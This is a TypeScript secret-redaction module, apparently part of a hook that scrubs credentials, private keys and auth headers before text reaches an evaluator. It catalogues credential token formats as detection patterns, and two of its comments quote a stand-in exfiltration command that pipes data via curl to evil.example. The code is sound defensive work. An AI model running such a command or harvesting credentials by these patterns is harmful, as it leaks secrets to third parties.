/**
 * Secret redaction for everything that leaves the machine in a Jev request.
 *
 * Two layers, deliberately different in how wide they cast:
 *
 * 1. **The shared floor**: `SECRET_PATTERNS`, the list the `sanitize-*`
 *    builtins BLOCK on. Blocking has to be narrow, because a false positive
 *    there denies work the user wanted.
 * 2. **The redactor's own margin**, everything else in this file. Redaction only
 *    swaps characters for a marker, and a false positive costs Jev a few
 *    characters of context it almost never needs to judge an action, while a
 *    miss sends a live credential to a third-party API. So this layer takes the
 *    shapes the floor cannot afford: assignments named like a secret
 *    (`GITHUB_TOKEN=…`, `"api_key": "…"`, `--password …`), header values,
 *    credentials inside URLs, whole PEM blocks, the values of this process's own
 *    secret-named environment variables, and long random-looking tokens.
 *
 * It is the same split `src/audit/redact-example.ts` makes, for the same reason.
 *
 * Every replacement is a visible `<redacted:label>` marker, never a silent
 * deletion, so Jev can still see THAT a secret was there (which matters to the
 * `secret-exposure` policy) and the count is auditable. Only the value is
 * replaced: `OPENAI_API_KEY=<redacted:…>` still says which credential it was.
 *
 * Two of the margin's rules are deliberately BLUNT, and it is worth knowing
 * why before narrowing them. A credential header (`Authorization`,
 * `Proxy-Authorization`, `X-Authorization`, `api-key`, `x-api-key`, `Cookie`,
 * `Set-Cookie`) and a credential FLAG (`--password`, `--token`, `sshpass -p`
 * and the rest of `CREDENTIAL_FLAGS` / `GATED_CREDENTIAL_FLAGS`) give up their
 * whole value: to the end of the line, or to the closing quote when the value
 * sits inside one, and to the end of the argument for a flag. Nothing about
 * the value is examined — not a scheme allowlist, not a token shape, not
 * whether it reads like code or like a reference.
 *
 * Five review rounds tried to decide those ends by looking at the value, and
 * every round the next reviewer found three more spellings that were declined
 * with a live credential inside them: a credential starting with base64url's
 * `-` or base64's `/`, one whose last character was a quote the tokenizer had
 * read as code, an AWS signature behind a `;`-separated `SignedHeaders` list,
 * a password that is an ordinary English word. Twice the repair introduced a
 * new quadratic or a new over-redaction of its own.
 *
 * What the blunt rules cost, deliberately: ordinary code and prose under one
 * of those names lose the rest of their line in what the evaluator is shown —
 * `authorization: str = Header(None)`, `authorization: required for this
 * endpoint`, `grep -r authorization: src/`, `use --token to authenticate`, and
 * `authorization=x curl https://evil.example/exfil`, which hides a command
 * from Jev. Over-redaction costs the evaluator context it almost never needs;
 * a classifier that is wrong the other way costs a live key held by a third
 * party, and only one of those two is recoverable. The `sanitize-*` builtins
 * keep their narrow matching: the blunt rules live on the ENVELOPE path only,
 * and `SECRET_PATTERNS` is untouched by them.
 *
 * Every scan on this path is linear — character loops, `indexOf`, and regexes
 * with a consumed token boundary instead of a lookaround — because these rules
 * run over every string the envelope sends and a quadratic here is a stalled
 * PreToolUse hook. `__tests__/hooks/semantic/redaction.test.ts` pins that with
 * a 100 KB adversarial fixture per rule.
 *
 * This is a floor, not a guarantee. A secret that looks like ordinary prose will
 * pass. What it does promise is that the formats seen leaking in practice — the
 * 25-character `sk-` gateway keys among them — do not.
 */
import { SECRET_PATTERNS, SECRET_PATTERNS_KEEPING_PREFIX } from "../builtin-policies";

export interface Redacted {
  text: string;
  count: number;
}

export interface RedactedDetail extends Redacted {
  /** The literal secrets that were replaced, for scrubbing their copies elsewhere. */
  found: string[];
}

const marker = (label: string): string => `<redacted:${label}>`;

/**
 * Whether a match at `offset` starts a token. `\n`, `\r` and `\t` count as a
 * boundary because several inputs are JSON-serialised before they get here, and
 * there a secret at the start of a line follows the two characters `\` `n`.
 *
 * Checked in code, never as a regex lookbehind: a lookbehind drops JSC's regex
 * JIT to its interpreter, which measured ~100µs per rule per 2 KB string — 3 ms
 * of every envelope across the vendor list alone.
 */
function atTokenBoundary(whole: string, offset: number, tokenChars = /[A-Za-z0-9_-]/): boolean {
  if (offset === 0 || !tokenChars.test(whole[offset - 1])) return true;
  return offset >= 2 && whole[offset - 2] === "\\" && /[nrt]/.test(whole[offset - 1]);
}

// ── Layer 1: the shared floor ────────────────────────────────────────────────

/**
 * `SECRET_PATTERNS`, made global — and, for the ones that end in a token
 * character class, extended to the END of the token they matched.
 *
 * The extension is what stops a partial redaction leaking the tail of a key.
 * `sk-[A-Za-z0-9]{20,}` stops at the first `-`, so a LiteLLM key whose 21st
 * character is a hyphen used to come out as `<redacted:OpenAI API key>-x7Qd`.
 * `ghp_[A-Za-z0-9]{36}` and `AKIA[A-Z0-9]{16}` are fixed-width and would do the
 * same to anything longer. The two patterns that end on a literal (`…@` for
 * connection strings, `-----` for a PEM header) are not extended: what follows
 * them is a hostname or a newline, not more of the secret.
 *
 * A pattern listed in `SECRET_PATTERNS_KEEPING_PREFIX` matched context in front
 * of the secret rather than the secret itself — the generic `sk-` entry's token
 * boundary, a consuming group because a lookbehind would cost the blocking
 * policy its regex JIT. Group 1 goes back in front of the marker. Membership is
 * read from that set rather than guessed from the pattern's source: a future
 * entry whose first group captures part of the SECRET would look identical to a
 * `startsWith("(")` test, and the redactor would print the secret it removed.
 */
const SHARED_RULES: ReadonlyArray<readonly [RegExp, string, boolean]> = SECRET_PATTERNS.map(([re, label]) => {
  const flags = re.flags.includes("g") ? re.flags : re.flags + "g";
  const extend = /[}+]$/.test(re.source);
  const keepsPrefix = SECRET_PATTERNS_KEEPING_PREFIX.has(re);
  return [new RegExp(extend ? `(?:${re.source})[A-Za-z0-9_-]*` : re.source, flags), label, keepsPrefix] as const;
});

/** Exposed for the test that pins which shared patterns are extended. */
export const SHARED_PATTERN_EXTENDED: ReadonlyArray<boolean> = SECRET_PATTERNS.map(([re]) => /[}+]$/.test(re.source));

// ── Layer 2: the redactor's margin ───────────────────────────────────────────

/**
 * A whole PEM private-key block, header to footer.
 *
 * The shared pattern matches the `BEGIN … PRIVATE KEY` armour header only —
 * enough for a detector, useless for a redactor, which would replace the header
 * and send the base64 key body underneath it. Each header is walked to its own
 * footer if it has one (`PEM_BODY_RUN_RE`), and otherwise takes the lines that
 * follow it while they still look like key material (base64 of 16+ characters,
 * or an encrypted key's `Proc-Type:`-style header line), separated by real or
 * JSON-escaped newlines — a block whose footer the envelope's length cap cut
 * away (`redactPemBlocks` adds a last line shorter than that when it ends the
 * text or meets the cut marker: a block cut mid-line). A lone header in a
 * command — a `grep` for the armour line across `*.pem` — therefore takes
 * nothing after it. The body of a complete block is limited to what a PEM body
 * contains, so a header and a footer quoted separately in documentation do not
 * take the prose between them.
 *
 * "JSON-escaped" is one to four backslashes before the `n`: a block inside a
 * JSON string that was itself serialised again (a service-account file passed
 * as a string argument, then stringified by the envelope at depth 2) arrives as
 * `\\n`. The count is bounded so a run of backslashes cannot backtrack.
 */
const PEM_ARMOUR_HEAD = String.raw`-----BEGIN[ A-Z0-9]*PRIVATE KEY(?: BLOCK)?-----`;
/** Every armour header in the text; the block after each one is measured in code. */
const PEM_HEADER_RE = new RegExp(PEM_ARMOUR_HEAD, "g");
/**
 * The longest run of characters a PEM body may contain, anchored at a header.
 *
 * It replaces the lazy `(?:body)*?-----END…` scan the rule used to open with.
 * That scan read to the end of the string before failing whenever no footer
 * FOR A PRIVATE KEY followed — from every header in the text, which made a
 * page of repeated armour lines (a `grep` hit list across a key directory)
 * quadratic, at up to 576 strings per envelope. Choosing the alternative on
 * `text.includes("-----END")` only moved the hole: eight characters of an
 * unrelated `-----END CERTIFICATE-----` put every header back on the lazy
 * path, and 2 000 characters of armour cost 1.5 ms again.
 *
 * A footer is reachable from a header exactly when it starts inside this run,
 * because a body character is the only thing the lazy scan could cross. The
 * run is the same for every start position inside it, so it is computed once
 * per run rather than once per header, and the whole walk stays linear.
 */
const PEM_BODY_RUN_RE = /(?:[A-Za-z0-9+/=\s:,.-]|\\{1,4}[nrt])*/y;
/** The key lines of a block whose footer the envelope's cap cut away. */
const PEM_TO_CUT = String.raw`(?:(?:\s|\\{1,4}[nrt])+(?:[A-Za-z0-9+/=]{16,}|[A-Za-z-]+:[^\n\\]*))*`;
const PEM_TO_CUT_RE = new RegExp(PEM_TO_CUT, "y");
/**
 * The short tail of a key line a cut split, right after a block that lost its
 * footer. Matched in code at the end of such a block: as an optional group at
 * the end of the block regex it cost that regex ~8x on every string.
 */
const PEM_CUT_FRAGMENT_RE = /(?:\s|\\{1,4}[nrt])+[A-Za-z0-9+/=]{1,15}(?=\s*(?:$|…\[))/y;

/** Every PEM private-key block, whole or cut short, as one marker each. */
function redactPemBlocks(text: string, counter: { n: number; found: string[] }): string {
  if (!text.includes("-----BEGIN")) return text;
  const footers = pemFooters(text);
  let fi = 0;
  // The body run last measured, reused by every header that starts inside it.
  let runFrom = -1;
  let runEnd = -1;
  let out = "";
  let last = 0;
  PEM_HEADER_RE.lastIndex = 0;
  for (let m = PEM_HEADER_RE.exec(text); m !== null; m = PEM_HEADER_RE.exec(text)) {
    const bodyStart = m.index + m[0].length;
    while (fi < footers.length && footers[fi].start < bodyStart) fi++;
    let end = -1;
    if (fi < footers.length) {
      if (bodyStart < runFrom || bodyStart > runEnd) {
        PEM_BODY_RUN_RE.lastIndex = bodyStart;
        runFrom = bodyStart;
        runEnd = bodyStart + (PEM_BODY_RUN_RE.exec(text)?.[0].length ?? 0);
      }
      if (footers[fi].start <= runEnd) end = footers[fi].end;
    }
    if (end < 0) {
      // No footer this block can reach: take the key lines the cap left.
      PEM_TO_CUT_RE.lastIndex = bodyStart;
      end = bodyStart + (PEM_TO_CUT_RE.exec(text)?.[0].length ?? 0);
      PEM_CUT_FRAGMENT_RE.lastIndex = end;
      const f = PEM_CUT_FRAGMENT_RE.exec(text);
      if (f) end += f[0].length;
    }
    out += text.slice(last, m.index) + marker("private key");
    counter.n++;
    counter.found.push(text.slice(m.index, end));
    last = end;
    PEM_HEADER_RE.lastIndex = end;
  }
  PEM_HEADER_RE.lastIndex = 0;
  return last === 0 ? text : out + text.slice(last);
}

/** Where every private-key footer in the text sits, in one pass. */
function pemFooters(text: string): Array<{ start: number; end: number }> {
  const out: Array<{ start: number; end: number }> = [];
  if (!text.includes("-----END")) return out;
  PEM_FOOTER_RE.lastIndex = 0;
  for (let m = PEM_FOOTER_RE.exec(text); m !== null; m = PEM_FOOTER_RE.exec(text)) {
    out.push({ start: m.index, end: m.index + m[0].length });
  }
  PEM_FOOTER_RE.lastIndex = 0;
  return out;
}

/**
 * A private-key footer. What survives the complete-block rule is a footer whose
 * header is not in the same string — almost always because the envelope's
 * head/tail cap dropped the header into the omitted middle and kept the last
 * lines of the key in the tail. `redactOrphanFooters` takes those lines.
 */
const PEM_FOOTER_RE = /-----END[ A-Z0-9]*PRIVATE KEY(?: BLOCK)?-----/g;
const BASE64_CHAR = /[A-Za-z0-9+/=]/;

/** Length of a JSON-escaped `\n`/`\r`/`\t` (one to four backslashes) ending just before `end`, or 0. */
function escapeBefore(text: string, end: number): number {
  const c = text[end - 1];
  if (c !== "n" && c !== "r" && c !== "t") return 0;
  let i = end - 1;
  while (i > 0 && text[i - 1] === "\\" && end - i <= 4) i--;
  return i < end - 1 ? end - i : 0;
}

/** Whether only whitespace separates `at` from the start of the text or the envelope's cut marker. */
function startsAfterCut(text: string, at: number, floor: number): boolean {
  let j = at;
  while (j > floor && /\s/.test(text[j - 1])) j--;
  return j === 0 || text[j - 1] === "…";
}

/**
 * The key lines in front of a footer that has no header, walking back from the
 * footer one line at a time. A line is a whole run of base64 between line
 * separators (real or escaped newlines). Every line must be 16+ characters
 * except two: the one right before the footer (a PEM body's short last line)
 * and one that starts the text or follows the cut marker (a line the cut
 * split). A short last line on its own counts only in that second position
 * too. Prose never qualifies: its lines have spaces in them.
 *
 * Returns where the key material starts, or -1.
 */
function orphanKeyStart(text: string, footerAt: number, floor: number): number {
  const lines: Array<{ start: number; len: number }> = [];
  let pos = footerAt;
  for (;;) {
    let j = pos;
    while (j > floor) {
      if (/\s/.test(text[j - 1])) j--;
      else {
        const esc = escapeBefore(text, j);
        if (esc === 0) break;
        j -= esc;
      }
    }
    if (j === pos && lines.length > 0) break;
    let k = j;
    while (k > floor && BASE64_CHAR.test(text[k - 1]) && escapeBefore(text, k) === 0) k--;
    const len = j - k;
    if (len === 0) break;
    // A whole line: it starts the text, or follows a separator, a quote or the cut marker.
    if (k > floor && !/[\s"'`…]/.test(text[k - 1]) && escapeBefore(text, k) === 0) break;
    if (lines.length > 0 && len < 16 && !startsAfterCut(text, k, floor)) break;
    lines.push({ start: k, len });
    pos = k;
  }
  if (lines.length === 0) return -1;
  if (lines.length === 1 && lines[0].len < 16 && !startsAfterCut(text, lines[0].start, floor)) return -1;
  return lines[lines.length - 1].start;
}

/** Redact key lines in front of every footer that lost its header. */
function redactOrphanFooters(text: string, counter: { n: number; found: string[] }): string {
  if (!text.includes("-----END")) return text;
  let out = "";
  let last = 0;
  PEM_FOOTER_RE.lastIndex = 0;
  for (let m = PEM_FOOTER_RE.exec(text); m !== null; m = PEM_FOOTER_RE.exec(text)) {
    const start = orphanKeyStart(text, m.index, last);
    if (start < 0) continue;
    const end = m.index + m[0].length;
    out += text.slice(last, start) + marker("private key");
    counter.n++;
    counter.found.push(text.slice(start, end));
    last = end;
  }
  PEM_FOOTER_RE.lastIndex = 0;
  return last === 0 ? text : out + text.slice(last);
}

/**
 * Vendor prefixes the shared list does not carry. They stay OUT of
 * `SECRET_PATTERNS` on purpose: the audit redactor masks `export
 * SLACK_BOT_TOKEN=xoxb-…` as an "assigned secret" and its tests pin that label,
 * and several of these are too new to have earned a blocking rule.
 */
const VENDOR_RULES: ReadonlyArray<readonly [RegExp, string]> = (
  [
    [String.raw`gh[pousr]_[A-Za-z0-9]{30,}`, "GitHub token"],
    [String.raw`github_pat_[A-Za-z0-9_]{30,}`, "GitHub fine-grained token"],
    [String.raw`glpat-[A-Za-z0-9_-]{20,}`, "GitLab token"],
    [String.raw`xox[abposr]-[A-Za-z0-9-]{10,}`, "Slack token"],
    [String.raw`xapp-\d-[A-Za-z0-9-]{10,}`, "Slack app token"],
    [String.raw`hf_[A-Za-z0-9]{30,}`, "Hugging Face token"],
    [String.raw`npm_[A-Za-z0-9]{36}`, "npm token"],
    [String.raw`pypi-AgEIcHlwaS5vcmc[A-Za-z0-9_-]{20,}`, "PyPI token"],
    [String.raw`(?:sk|rk)_(?:live|test)_[A-Za-z0-9]{16,}`, "Stripe secret key"],
    [String.raw`whsec_[A-Za-z0-9+/=]{20,}`, "webhook signing secret"],
    [String.raw`ASIA[A-Z0-9]{16}`, "AWS temporary access key ID"],
    [String.raw`ya29\.[A-Za-z0-9_-]{20,}`, "Google OAuth token"],
    [String.raw`GOCSPX-[A-Za-z0-9_-]{20,}`, "Google OAuth client secret"],
    [String.raw`1//0[A-Za-z0-9_-]{30,}`, "Google refresh token"],
    [String.raw`SG\.[A-Za-z0-9_-]{16,}\.[A-Za-z0-9_-]{16,}`, "SendGrid API key"],
    [String.raw`gsk_[A-Za-z0-9]{30,}`, "Groq API key"],
    [String.raw`xai-[A-Za-z0-9]{30,}`, "xAI API key"],
    [String.raw`pplx-[A-Za-z0-9]{30,}`, "Perplexity API key"],
    [String.raw`r8_[A-Za-z0-9]{30,}`, "Replicate token"],
    [String.raw`sbp_[A-Za-z0-9]{30,}`, "Supabase token"],
    [String.raw`sb_secret_[A-Za-z0-9_-]{16,}`, "Supabase secret key"],
    [String.raw`dapi[0-9a-f]{32}`, "Databricks token"],
    [String.raw`shp(?:at|ca|pa|ss)_[0-9a-fA-F]{32}`, "Shopify token"],
    [String.raw`lin_api_[A-Za-z0-9]{30,}`, "Linear API key"],
    [String.raw`ntn_[A-Za-z0-9]{30,}`, "Notion token"],
    [String.raw`ATATT3[A-Za-z0-9_=-]{30,}`, "Atlassian API token"],
    [String.raw`dp\.(?:st|ct|sa|scim|audit|pt)\.[A-Za-z0-9_-]{30,}`, "Doppler token"],
    [String.raw`tskey-[a-z]+-[A-Za-z0-9-]{16,}`, "Tailscale key"],
    [String.raw`do[oprt]_v1_[a-f0-9]{64}`, "DigitalOcean token"],
    [String.raw`AGE-SECRET-KEY-1[0-9A-Z]{50,}`, "age secret key"],
    // Any other `sk-` token, down to the 16 characters the collector's own
    // redactor (crates/fpai-collect/src/redact.rs) uses.
    [String.raw`sk-[A-Za-z0-9_-]{16,}`, "sk- API key"],
  ] as const
).map(([src, label]) => [new RegExp(`${src}[A-Za-z0-9_-]*`, "g"), label] as const);

/** Webhook URLs whose path IS the credential. */
const WEBHOOK_RULES: ReadonlyArray<readonly [RegExp, string]> = [
  [/(hooks\.slack\.com\/(?:services|workflows|triggers)\/)[A-Za-z0-9_/-]{16,}/g, "Slack webhook"],
  [/(discord(?:app)?\.com\/api\/webhooks\/\d+\/)[A-Za-z0-9_-]{20,}/g, "Discord webhook"],
  [/(api\.telegram\.org\/(?:file\/)?bot)\d{6,}:[A-Za-z0-9_-]{30,}/g, "Telegram bot token"],
];

/**
 * `scheme://user:password@host` on ANY scheme; the shared list covers
 * databases only.
 *
 *   1  the token boundary in front of the scheme
 *   2  the scheme   3  the user   4  the password
 *
 * Group 1 is what keeps the scan LINEAR, the same device and the same reason
 * as `ASSIGNMENT_RE`. A `\b` here matched after every `-` and every `.`,
 * because both are non-word characters, and `[a-z][a-z0-9+.-]*` then consumed
 * the rest of the run and backtracked over it at each of those starts: a
 * 4 000-character run of `a-a-a-…` cost 11 ms, 8 000 cost 45 ms, and the two
 * URL rules together were 44 of the 47 ms the whole redactor spent on it. A
 * boundary character that the scheme itself cannot contain makes every
 * position inside such a run fail in one step. The boundary is consumed rather
 * than looked behind (a lookbehind drops JSC's regex JIT) and re-emitted in
 * front of the replacement. A scheme in a real URL always follows a character
 * outside `[A-Za-z0-9_.+-]` — or starts the string, or a JSON-escaped line.
 */
const URL_CREDENTIALS_RE = /(^|\\[nrt]|[^A-Za-z0-9_.+-])([a-z][a-z0-9+.-]*:\/\/)([^\s/@:"'<>]+):([^\s/@"'<>]+)@/gi;

/**
 * `scheme://<token>@host`, the shape `git clone https://<token>@github.com/…`
 * uses. Boundary group as in `URL_CREDENTIALS_RE`, for the same reason.
 */
const URL_TOKEN_USERINFO_RE = /(^|\\[nrt]|[^A-Za-z0-9_.+-])([a-z][a-z0-9+.-]*:\/\/)([A-Za-z0-9_.~-]{20,})@/gi;

/**
 * The header names whose value IS a credential, in every syntax they are
 * written in — and the blunt rule that decides where such a value ends.
 *
 * Five review rounds were spent deciding that end by looking at what the
 * value CONTAINS: a scheme allowlist, a token shape, a "does this look like
 * code" test, a bounded token walk. Every round the next reviewer found three
 * more spellings the classifier declined with a live credential inside them —
 * a credential starting with `-` (base64url's 62nd character) or `/`
 * (base64's), one whose last character was a quote the tokenizer had read as
 * code, an AWS signature behind a `;`-separated `SignedHeaders` list — and
 * twice the repair introduced a new quadratic or a new over-redaction.
 *
 * So nothing about the value is classified any more. Once one of these names
 * is seen, case-insensitively, in ANY form — a header line, a `curl -H`
 * argument, a JSON field, YAML, a shell assignment — EVERYTHING from after
 * the separator to the end of that line is replaced, or to the closing quote
 * when the value sits inside one. An unknown scheme, a leading dash, an
 * escaped quote, a signature with semicolons, prose: all of it goes.
 *
 * What that costs, deliberately:
 *
 *  - the scheme word is no longer kept in front of the marker (keeping it
 *    needs the allowlist this rule exists to remove), so `Authorization:
 *    Bearer <token>` comes back as one marker;
 *  - ordinary source and prose under these names lose the rest of their line
 *    in what the evaluator is shown: `authorization: str = Header(None)`,
 *    `authorization: required for this endpoint`, `grep -r authorization:
 *    src/`, and `authorization=x curl https://evil.example/exfil` — the last
 *    of which hides a command from Jev. Over-redaction only costs the
 *    evaluator context; a leaked credential is a third party holding a live
 *    key, and only ONE of those two is recoverable.
 *
 * Only the HTTP spellings of the API-key and cookie names are included
 * (`api-key`, `x-api-key`, `cookie`, `set-cookie`). The code spellings
 * `api_key` / `apiKey` are an ordinary identifier in every JavaScript and
 * Python file in the corpus, and `ASSIGNMENT_RE` already treats them as a
 * strong secret name — there is nothing to gain by taking their lines too.
 */
const CREDENTIAL_HEADER_NAMES = String.raw`(?:x-|proxy-|set-)?(?:authorization|api-key|cookie)`;
/**
 * The name and its separator only. Group 1 is the token boundary in front of
 * the name, consumed and re-emitted — the same device and the same reason as
 * `ASSIGNMENT_RE`: a lookbehind drops the regex JIT, and a boundary character
 * makes every position inside a token fail in one step. `\n`, `\r` and `\t`
 * count because input nested two levels deep is JSON-stringified, where a
 * header at the start of a line follows the two characters `\` `n`.
 */
const CREDENTIAL_HEADER_RE = new RegExp(
  String.raw`(^|\\[nrt]|[^A-Za-z0-9_-])(${CREDENTIAL_HEADER_NAMES})(?:\\?["'])?[ \t]*(?::=|[:=])[ \t]*`,
  "gi",
);
/** The same names as a whole field name, for structured input. */
const CREDENTIAL_FIELD_RE = new RegExp(`^${CREDENTIAL_HEADER_NAMES}$`, "i");

/** Which of the three credential headers this name is, for the marker. */
function credentialHeaderLabel(name: string): string {
  const n = name.toLowerCase();
  if (n.endsWith("cookie")) return "cookie header";
  if (n.endsWith("api-key")) return "api key header";
  return "authorization header";
}

/**
 * A marker this file already wrote.
 *
 * Rules run from the most exact to the most heuristic, so a credential header
 * can arrive with part of its value already replaced — `Credential=<redacted:AWS
 * access key ID>/20260922, Signature=…` after the shared floor took the access
 * key. Such a value is still redacted whole (the signature behind the marker is
 * a credential), but a value that is NOTHING but markers is already done, which
 * is what makes a second pass over redacted text a no-op.
 */
const AUTH_MARKER_HEAD = "<redacted:";
const AUTH_MARKER_RE = /<redacted:[^>]*>/g;
const withoutMarkers = (s: string): string => s.replace(AUTH_MARKER_RE, "");

/** A token without the shell quotes around it or the punctuation after it. */
function bareArgument(t: string): string {
  const s = t.replace(/[,;]+$/, "");
  const m = /^(["'])([\s\S]*)\1$/.exec(s);
  return m ? m[2] : s;
}

/** Where the scan has got to, and the quote that is open there. */
interface QuoteCursor {
  pos: number;
  /** The exact delimiter that opened: `"`, `'`, or a JSON-escaped `\"` / `\'`. */
  open: string | null;
}

/**
 * Carry the quote state forward to `to`, in ONE pass over each character.
 *
 * The header's value ends at the quote the header itself sits inside —
 * `curl -H "Authorization: …"`, `{"Authorization: …"}`, `['Authorization: …']`
 * all write the name and the value inside one string — and finding that quote
 * by scanning BACK from each name is quadratic on a line with many names. The
 * cursor only ever moves forward, so the whole walk is linear however many
 * names the line holds. Quote state resets at every line, so an apostrophe in
 * prose cannot make a value on a later line end early — and where it does
 * confuse the state on its own line, the fallback is the end of the line,
 * which redacts MORE, not less.
 */
function advanceQuotes(text: string, cur: QuoteCursor, to: number): void {
  let i = cur.pos;
  while (i < to) {
    const c = text[i];
    if (c === "\n" || c === "\r") {
      cur.open = null;
      i++;
      continue;
    }
    if (c === "\\") {
      const n = text[i + 1];
      if (n === undefined) {
        i++;
        continue;
      }
      if (n === "n" || n === "r") {
        cur.open = null;
        i += 2;
        continue;
      }
      if (n === '"' || n === "'") {
        const q = c + n;
        if (cur.open === null) cur.open = q;
        else if (cur.open === q) cur.open = null;
        i += 2;
        continue;
      }
      i += 2;
      continue;
    }
    if (c === '"' || c === "'") {
      if (cur.open === null) cur.open = c;
      else if (cur.open === c) cur.open = null;
      i++;
      continue;
    }
    i++;
  }
  cur.pos = i;
}

/** What may follow a quote that really closed the value around it. */
const VALUE_CLOSED_BY = /[\s,;&|}\])]/;

/**
 * Whether the quote at `at` closes the value, or is one the shell glues to
 * more of the same argument: `curl -H "Authorization: hmac "$PW"" https://x`
 * is ONE header value in three quoted pieces, and stopping at the first of
 * them sends the rest of it to Jev. A quote that closed something is followed
 * by whitespace, a separator, a closing bracket or the end of the text.
 */
function quoteClosesValue(text: string, at: number, close: string): boolean {
  const after = at + close.length;
  const c = text[after];
  if (c === undefined) return true;
  if (VALUE_CLOSED_BY.test(c)) return true;
  return c === "\\" && /[nr]/.test(text[after + 1] ?? "");
}

/**
 * Where a credential header's value ends: the closing quote when it is inside
 * one, otherwise the end of the line. A character loop, so a 100 KB line costs
 * 100 KB of work and no regex can backtrack over it.
 */
function credentialValueEnd(text: string, start: number, close: string | null): number {
  let i = start;
  while (i < text.length) {
    const c = text[i];
    if (c === "\n" || c === "\r") return i;
    if (close !== null && text.startsWith(close, i) && quoteClosesValue(text, i, close)) return i;
    if (c === "\\") {
      const n = text[i + 1];
      if (n === "n" || n === "r") return i;
      i += n === undefined ? 1 : 2;
      continue;
    }
    i++;
  }
  return text.length;
}

/**
 * What of a redacted header value to hand `scrubKnownSecrets`, which replaces
 * every copy of it in the REST of the envelope.
 *
 * Only text that was actually redacted as a credential may go on that list.
 * Two exclusions do all the work, and neither of them looks at what a token
 * contains:
 *
 *  - a region holding a marker reports nothing. Whatever was secret in it was
 *    already found and reported by the earlier rule that wrote the marker, and
 *    splitting the rest on whitespace produced fragments of the MARKER —
 *    `<redacted:OpenAI` is sixteen characters, so `scrubKnownSecrets` accepted
 *    it and mangled every other marker in the envelope.
 *  - the first piece of a multi-piece value is dropped. That position is the
 *    only one a public scheme name can occupy (`Bearer`, `AWS4-HMAC-SHA256`,
 *    `Hawk`, `NTLM`), and `AWS4-HMAC-SHA256` is exactly sixteen characters too:
 *    reporting it deleted the human's own words from `user_said`. A value of
 *    ONE piece has no scheme in front of it and is reported whole.
 */
function credentialRegionSecrets(region: string): string[] {
  if (region.includes(AUTH_MARKER_HEAD)) return [];
  const pieces = region.split(/\s+/).filter(Boolean);
  const out: string[] = [];
  const push = (s: string): void => {
    const b = bareArgument(s);
    if (b && !out.includes(b)) out.push(b);
  };
  for (const piece of pieces.length === 1 ? pieces : pieces.slice(1)) {
    push(piece);
    // `Signature=<value>`: the bare value travels on its own elsewhere.
    const param = /^[A-Za-z][A-Za-z0-9_.-]*=([\s\S]+)$/.exec(bareArgument(piece));
    if (param) push(param[1]);
  }
  return out;
}

/** Every credential header's value in `text`, as one marker each. */
function redactCredentialHeaders(text: string, counter: { n: number; found: string[] }): string {
  let out = "";
  let last = 0;
  const cur: QuoteCursor = { pos: 0, open: null };
  CREDENTIAL_HEADER_RE.lastIndex = 0;
  for (let m = CREDENTIAL_HEADER_RE.exec(text); m !== null; m = CREDENTIAL_HEADER_RE.exec(text)) {
    const valueAt = m.index + m[0].length;
    if (cur.pos < valueAt) advanceQuotes(text, cur, valueAt);
    let close = cur.open;
    let start = valueAt;
    if (close === null) {
      // The value opens a quote of its own: `{"Authorization": "Bearer …"}`.
      const c = text[valueAt];
      if (c === '"' || c === "'") {
        close = c;
        start = valueAt + 1;
      } else if (c === "\\" && (text[valueAt + 1] === '"' || text[valueAt + 1] === "'")) {
        close = text.slice(valueAt, valueAt + 2);
        start = valueAt + 2;
      }
    }
    const end = credentialValueEnd(text, start, close);
    const region = text.slice(start, end);
    // Nothing left to take: an empty value, or one an earlier rule already
    // replaced whole — which is what makes a second pass a no-op.
    if (withoutMarkers(region).trim() === "") continue;
    out += text.slice(last, start) + marker(credentialHeaderLabel(m[2]));
    counter.n++;
    for (const s of credentialRegionSecrets(region)) counter.found.push(s);
    last = end;
    CREDENTIAL_HEADER_RE.lastIndex = end;
  }
  CREDENTIAL_HEADER_RE.lastIndex = 0;
  return last === 0 ? text : out + text.slice(last);
}

/**
 * A Bearer credential with no `Authorization` in front of it — `"Bearer …"` as a
 * value in a script or a config. Must look like a token, because "bearer" is also
 * an English word ("the bearer authentication scheme").
 */
const BEARER_RE = /\b(bearer[ \t]+)([A-Za-z0-9\-._~+/=]{8,})/gi;

/**
 * Credential arguments on the command line.
 *
 * The same blunt rule as the credential headers, for the same reason: the FLAG
 * decides, never the value. `--password swordfish` is a password although
 * nothing about `swordfish` says so, and `-p -aB3xY…`, `--api-key '$ecret'`
 * and `--token <paste-it-here>` are credentials whose first character used to
 * disqualify them. So the WHOLE argument goes — quoted or bare, attached
 * (`-p'pw'`) or separate, reference-shaped or not.
 *
 * Deliberately blunter than before: `use --token to authenticate` and
 * `failproofai config --token <token>` now lose their next word to a marker.
 *
 * The flag list is fixed rather than name-derived, because the list is the
 * whole false-positive guard. A long flag that names a credential is one
 * wherever it appears; a SHORT one is ambiguous (`-p` is `--parents` to
 * `mkdir` and a port map to `docker run`), so it counts only behind a command
 * that takes a credential that way, found in a bounded window that never
 * crosses a command separator. Short flags are matched case-SENSITIVELY:
 * mysql's `-P` is the port and its `-p` is the password. Other secret-named
 * flags (`--dsn`, `--pat`) stay with `FLAG_VALUE_RE`, which still asks what
 * the value looks like.
 */
const CREDENTIAL_FLAGS: ReadonlySet<string> = new Set([
  "--password",
  "--passwd",
  "--passphrase",
  "--pwd",
  "--token",
  "--api-token",
  "--auth-token",
  "--access-token",
  "--refresh-token",
  "--session-token",
  "--private-token",
  "--personal-access-token",
  "--secret",
  "--client-secret",
  "--api-key",
  "--apikey",
  "--admin-password",
  "--db-password",
  "--registry-password",
  "--credential",
  "--credentials",
]);

/** A short or ambiguous flag, and the command that makes it a credential. */
interface GatedFlag {
  flag: string;
  commands: ReadonlyArray<string>;
  /** A second word that must be in the window too (`docker … login -p`). */
  also?: string;
  /** mysql's `-p` takes its password GLUED; a bare `-p` prompts, and the word
   *  after it is the database. */
  attachedOnly?: boolean;
}
const GATED_CREDENTIAL_FLAGS: ReadonlyArray<GatedFlag> = [
  { flag: "-p", commands: ["mysql", "mysqldump", "mysqladmin", "mariadb", "mariadb-dump"], attachedOnly: true },
  { flag: "-p", commands: ["sshpass"] },
  { flag: "-p", commands: ["docker", "podman", "helm", "oras", "skopeo", "buildah", "nerdctl"], also: "login" },
  { flag: "-a", commands: ["redis-cli"] },
  { flag: "-b", commands: ["gh"], also: "secret" },
  { flag: "--body", commands: ["gh"], also: "secret" },
];
/** `curl -u user:pass`: the user is kept, everything after the `:` is not. */
const BASIC_AUTH_FLAGS: ReadonlySet<string> = new Set(["-u", "--user", "--proxy-user"]);
const BASIC_AUTH_COMMANDS: ReadonlyArray<string> = ["curl", "wget", "http", "xh", "httpie"];
/**
 * How far back a gated flag looks for its command. Bounded, so the scan stays
